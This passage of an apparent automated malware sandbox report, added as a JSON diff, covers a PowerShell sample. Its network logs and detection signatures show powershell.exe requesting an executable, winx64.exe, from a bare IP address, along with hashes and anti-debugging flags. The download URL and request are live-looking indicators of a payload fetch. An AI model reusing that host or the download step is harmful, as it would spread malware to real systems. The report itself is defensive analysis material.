+            "sha256": "b9bad49dba2747e58e7635229bc4aa1c4eca5d577048610d0653c1bf1e38c865",
+            "sha512": "afebe62f1826ea9506fd33461df250d460c3feeed5c45d6af37520d1dd1927232a9e8f67f5e92d84b586aebb0deb8578184655de12b17cbfabeae568bb50e09f",
+            "ssdeep": "192:FIJq7SCfQcuCD5THk2nCsCWmKOGhe5/6SCyiHBzbxXyS:uSk2C0Wm",
+            "type": "Unicode text, UTF-8 (with BOM) text",
+            "yara": [],
+            "domains": [
+                "94.102.58.30"
+            ],
+            "ips": [],
+            "urls": [
+                "http://94.102.58.30/"
+            ],
+            "mails": [],
+            "package": "ps1",
+            "judge_type": "",
+            "type_detail": ""
+        },
+        "run_files": [],
+        "sub_files": []
+    },
+    "network": {
+        "mitm": [],
+        "pcap_sha256": "63fdedcffd4f7e8ae4973c289ef6e46d1d1fd714365a7addb78246d459a643cb",
+        "tcp": [
+            {
+                "src": "192.168.7.176",
+                "sport": 49178,
+                "dst": "94.102.58.30",
+                "dport": 80,
+                "offset": 53623,
+                "time": 31.11157488822937,
+                "ppid": 3576,
+                "pid": 3600,
+                "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "process_name": "powershell.exe"
+            }
+        ],
+        "udp": [],
+        "icmp": [],
+        "http": [
+            {
+                "count": 1,
+                "host": "94.102.58.30",
+                "port": 80,
+                "data": "GET /~trevor/winx64.exe HTTP/1.1\r\nHost: 94.102.58.30\r\nConnection: Keep-Alive\r\n\r\n",
+                "uri": "http://94.102.58.30/~trevor/winx64.exe",
+                "body": "",
+                "path": "/~trevor/winx64.exe",
+                "version": "1.1",
+                "method": "GET"
+            }
+        ],
+        "tls": [],
+        "dns": [],
+        "smtp": [],
+        "irc": [],
+        "irc_ex": [],
+        "dns_servers": [
+            "8.8.4.4",
+            "8.8.8.8"
+        ],
+        "fingerprint": [
+            {
+                "timestamp": "2023-05-20T11:47:47.572046",
+                "sourceIp": "192.168.7.176",
+                "destinationIp": "94.102.58.30",
+                "sourcePort": "49178",
+                "destinationPort": "80",
+                "protocol": "http",
+                "http": {
+                    "requestURI": "/~trevor/winx64.exe",
+                    "requestFullURI": "http://94.102.58.30/~trevor/winx64.exe",
+                    "requestVersion": "HTTP/1.1",
+                    "requestMethod": "GET",
+                    "userAgent": "",
+                    "clientHeaderOrder": "host,connection",
+                    "clientHeaderHash": "c8b000d7be999a9625f9f3fda9005742",
+                    "hfingerAlgorithms": "1.3|2|0.9|exe|||GE|1|ho,co|co:Ke-Al|||",
+                    "hfingerHash": "fccf6c1c3f14a06ae5cbf8841e8535e0"
+                }
+            }
+        ],
+        "tcp_ex": [
+            {
+                "src": "192.168.7.176",
+                "dst": "94.102.58.30",
+                "sport": 49178,
+                "dport": 80,
+                "proto": 6,
+                "proc_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "proc_name": "powershell.exe",
+                "pid": 3600,
+                "time": 31.113245964050293,
+                "tcp_detail": [
+                    {
+                        "time": 31.11320996284485,
+                        "type": "request",
+                        "size": 76,
+                        "sha256": "ff3926c8370d9299deeca8ea0370f36cb7901de56fd0770b4a727b3e45ec595b"
+                    }
+                ]
+            }
+        ],
+        "http_ex": [
+            {
+                "time": 31.11157488822937,
+                "src": "192.168.7.176",
+                "sport": 49178,
+                "dst": "94.102.58.30",
+                "dport": 80,
+                "protocol": "http",
+                "method": "GET",
+                "host": "94.102.58.30",
+                "uri": "/~trevor/winx64.exe",
+                "status": 0,
+                "request": "GET /~trevor/winx64.exe HTTP/1.1\r\nHost: 94.102.58.30\r\nConnection: Keep-Alive",
+                "response": "",
+                "req": {
+                    "file_info": {
+                        "name": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+                        "size": 0,
+                        "crc32": "00000000",
+                        "md5": "d41d8cd98f00b204e9800998ecf8427e",
+                        "sha1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+                        "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+                        "sha512": "cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e",
+                        "ssdeep": "3::",
+                        "type": "empty",
+                        "yara": [],
+                        "domains": [],
+                        "ips": [],
+                        "urls": [],
+                        "mails": []
+                    },
+                    "trid_info": [],
+                    "md5": "d41d8cd98f00b204e9800998ecf8427e",
+                    "sha1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+                    "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+                },
+                "resp": {
+                    "path": null,
+                    "file_info": null,
+                    "trid_info": null,
+                    "md5": null,
+                    "sha1": null,
+                    "sha256": null
+                },
+                "md5": null,
+                "sha1": null,
+                "sha256": null,
+                "path": null,
+                "pid": 3600,
+                "process_name": "powershell.exe"
+            }
+        ],
+        "https_ex": [],
+        "smtp_ex": [],
+        "dead_hosts": [],
+        "domains": [],
+        "hosts": [
+            "94.102.58.30"
+        ]
+    },
+    "signatures": [
+        {
+            "name": "network_http",
+            "description": "Performs some HTTP requests",
+            "severity": 1,
+            "families": [],
+            "references": [],
+            "marks": [
+                {
+                    "type": "generic",
+                    "method": "GET",
+                    "protocol": "http",
+                    "host": "94.102.58.30",
+                    "uri": "/~trevor/winx64.exe",
+                    "request": "GET /~trevor/winx64.exe HTTP/1.1\r\nHost: 94.102.58.30\r\nConnection: Keep-Alive"
+                }
+            ],
+            "markcount": 1,
+            "attck_info": {},
+            "attck_id": "",
+            "sig_class": "Network Related",
+            "gray": false
+        },
+        {
+            "name": "ipurl_in_string",
+            "description": "Found potential IP address or url in binary/memory",
+            "severity": 1,
+            "families": [],
+            "references": [],
+            "marks": [
+                {
+                    "type": "ioc",
+                    "category": "url",
+                    "ioc": "http://94.102.58.30/~trevor/winx64.exe",
+                    "pid": [],
+                    "description": null
+                },
+                {
+                    "type": "ioc",
+                    "category": "ip",
+                    "ioc": "94.102.58.30",
+                    "pid": [
+                        3600
+                    ],
+                    "description": null
+                }
+            ],
+            "markcount": 2,
+            "attck_info": {},
+            "attck_id": "",
+            "sig_class": "Static File Characteristics",
+            "gray": false
+        },
+        {
+            "name": "network_cnc_http",
+            "description": "HTTP traffic contains suspicious features which may be indicative of malware related traffic",
+            "severity": 2,
+            "families": [],
+            "references": [],
+            "marks": [
+                {
+                    "type": "generic",
+                    "suspicious_features": "GET method with no useragent header, Connection to IP address",
+                    "suspicious_request": "GET http://94.102.58.30/~trevor/winx64.exe"
+                }
+            ],
+            "markcount": 1,
+            "attck_info": {},
+            "attck_id": "",
+            "sig_class": "Network Related",
+            "gray": false
+        },
+        {
+            "name": "create_guard_page",
+            "description": "Contains functionality to create guard pages, often used to hinder reverse engineering and debugging",
+            "severity": 2,
+            "families": [],
+            "references": [],
+            "marks": [
+                {
+                    "type": "call",
+                    "pid": 3600,
+                    "cid": 233,
+                    "call": {
+                        "tid": 3716,
+                        "time": 1684500425.968625,
+                        "api": "NtAllocateVirtualMemory",
+                        "category": "process",
+                        "status": 1,
+                        "return_value": 0,
+                        "arguments": {
+                            "process_handle": "0xffffffff",
+                            "base_address": "0x0521d000",
+                            "region_size": 8192,
+                            "allocation_type": 4096,
+                            "protection": 260,
+                            "stack_pivoted": 0,
+                            "stack_dep_bypass": 0,
+                            "heap_dep_bypass": 0,
+                            "process_identifier": 3600
+                        },
+                        "flags": {
+                            "protection": "PAGE_READWRITE|PAGE_GUARD",
+                            "allocation_type": "MEM_COMMIT"
+                        },
+                        "stacktrace": []
+                    }
+                },
+                {
+                    "type": "call",
+                    "pid": 3600,
+                    "cid": 281,
+                    "call": {
+                        "tid": 3724,
+                        "time": 1684500426.015625,
+                        "api": "NtAllocateVirtualMemory",
+                        "category": "process",
+                        "status": 1,
+                        "return_value": 0,
+                        "arguments": {
+                            "process_handle": "0xffffffff",
+                            "base_address": "0x0537d000",
+                            "region_size": 8192,
+                            "allocation_type": 4096,
+                            "protection": 260,
+                            "stack_pivoted": 0,
+                            "stack_dep_bypass": 0,
+                            "heap_dep_bypass": 0,
+                            "process_identifier": 3600
+                        },
+                        "flags": {
+                            "protection": "PAGE_READWRITE|PAGE_GUARD",
+                            "allocation_type": "MEM_COMMIT"
+                        },
+                        "stacktrace": []
+                    }
+                },
+                {
+                    "type": "call",
+                    "pid": 3600,
+                    "cid": 781,
+                    "call": {
+                        "tid": 3728,
+                        "time": 1684500426.750625,
+                        "api": "NtAllocateVirtualMemory",
+                        "category": "process",
+                        "status": 1,
+                        "return_value": 0,
+                        "arguments": {
+                            "process_handle": "0xffffffff",
+                            "base_address": "0x0546d000",
+                            "region_size": 8192,
+                            "allocation_type": 4096,
+                            "protection": 260,
+                            "stack_pivoted": 0,
+                            "stack_dep_bypass": 0,
+                            "heap_dep_bypass": 0,
+                            "process_identifier": 3600
+                        },
+                        "flags": {
+                            "protection": "PAGE_READWRITE|PAGE_GUARD",
+                            "allocation_type": "MEM_COMMIT"
+                        },
+                        "stacktrace": []
+                    }
+                },
+                {
+                    "type": "call",
+                    "pid": 3600,
+                    "cid": 3438,
+                    "call": {
+                        "tid": 3816,
+                        "time": 1684500430.187625,
+                        "api": "NtAllocateVirtualMemory",
+                        "category": "process",
+                        "status": 1,
+                        "return_value": 0,
+                        "arguments": {
+                            "process_handle": "0xffffffff",
+                            "base_address": "0x057ed000",
+                            "region_size": 8192,
+                            "allocation_type": 4096,
+                            "protection": 260,
+                            "stack_pivoted": 0,
+                            "stack_dep_bypass": 0,
+                            "heap_dep_bypass": 0,
+                            "process_identifier": 3600
+                        },
+                        "flags": {
+                            "protection": "PAGE_READWRITE|PAGE_GUARD",
+                            "allocation_type": "MEM_COMMIT"
+                        },
+                        "stacktrace": []
+                    }
+                }
+            ],
+            "markcount": 4,
+            "attck_info": {},
+            "attck_id": "",
+            "sig_class": "Anti-Reverse Engineering",
+            "gray": false
+        }
+    ],
+    "tags": [],
+    "signatures_gray": []
+}
